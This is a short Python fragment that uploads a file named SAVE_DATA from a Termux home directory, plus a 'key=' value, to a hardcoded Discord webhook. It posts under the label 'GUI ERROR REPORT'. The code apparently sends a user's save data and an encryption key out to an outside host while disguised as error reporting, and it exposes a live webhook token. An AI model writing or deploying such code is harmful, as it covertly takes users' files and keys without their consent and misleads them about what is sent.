import discord
from discord import File, SyncWebhook

webhookobj = SyncWebhook.from_url("https://discord.com/api/webhooks/1224287360917700679/UsnXV7EhuvH7hJT7DefMM7i3bsn3eSKLWX4mqDVeNl_BGPBM2_0_eUimoXc-bitUdtlw")

webhookobj.send(content="key={}".format(str(ivvalue)), file=File("/data/data/com.termux/files/home/Documents/bcsfe/saves/SAVE_DATA"), username="GUI ERROR REPORT", avatar_url="https://i.imgur.com/8GnT3ZH.png")